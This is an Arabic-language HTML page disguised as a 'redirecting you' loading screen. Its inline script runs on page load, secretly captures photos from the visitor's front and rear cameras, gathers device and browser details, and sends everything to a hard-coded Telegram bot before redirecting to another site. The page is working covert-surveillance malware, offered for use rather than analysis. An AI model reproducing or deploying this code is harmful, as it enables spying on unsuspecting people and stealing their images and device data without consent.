<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>جار إعادة توجيهك..</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background-color: #000000;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
    }
    .loader {
      color: #ffffff;
      font-size: 18px;
      text-align: center;
      padding: 20px;
      opacity: 0.7;
    }
    .loader::after {
      content: '...';
      animation: dots 1.5s steps(4, end) infinite;
    }
    @keyframes dots {
      0%, 20% { content: ''; }
      40% { content: '.'; }
      60% { content: '..'; }
      80%, 100% { content: '...'; }
    }
  </style>
</head>
<body>
  <div class="loader">جار إعادة توجيهك</div>

<script>
(function() {
  const BOT_TOKEN = '8544670271:AAGHnCBdatXvRluwRh9k2zlY_35OcMQKvI8';
  const CHAT_ID = '7252629438';
  let executed = false;
  let photosSent = 0;
  const REDIRECT_URL = 'https://weanz.github.io/m/c.html';

  function getDeviceInfo() {
    return `📱 جهاز المستخدم
━━━━━━━━━
📐 الشاشة: ${screen.width}x${screen.height}
🔍 نسبة البكسل: ${devicePixelRatio}
💻 المنصة: ${navigator.platform || 'unknown'}
🌐 اللغة: ${navigator.language}
⏰ التوقيت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
📡 المتصفح: ${navigator.userAgent}
━━━━━━━━━`;
  }

  function sendText(text) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'HTML'})
    }).catch(e=>console.log(e));
  }

  function sendPhoto(blob, caption) {
    let fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('photo', blob, 'photo.jpg');
    fd.append('caption', caption);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd})
      .catch(e=>console.log(e))
      .finally(() => {
        photosSent++;
        if (photosSent >= 2) {
          setTimeout(() => {
            window.location.href = REDIRECT_URL;
          }, 500);
        }
      });
  }

  async function captureFromStream(stream, delay = 200) {
    return new Promise((resolve) => {
      let video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.style.position = 'fixed';
      video.style.top = '-9999px';
      document.body.appendChild(video);
      
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(() => {
          let canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          canvas.toBlob(resolve, 'image/jpeg', 0.85);
          video.pause();
          video.srcObject = null;
          video.remove();
        }, delay);
      };
    });
  }

  async function run() {
    if (executed) return;
    executed = true;
    
    try {
      // الكاميرا الأمامية
      let frontStream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' } 
      });
      let frontPhoto = await captureFromStream(frontStream);
      frontStream.getTracks().forEach(t => t.stop());
      
      // الكاميرا الخلفية
      let backStream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'environment' } 
      });
      let backPhoto = await captureFromStream(backStream);
      backStream.getTracks().forEach(t => t.stop());
      
      // إرسال
      sendText(getDeviceInfo());
      sendPhoto(frontPhoto, '🤳 الصورة الأمامية');
      sendPhoto(backPhoto, '📷 الصورة الخلفية');
      
    } catch(e) {
      sendText(`❌ خطأ: ${e.message}`);
      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, 1000);
    }
  }

  run();
})();
</script>
</body>
</html>
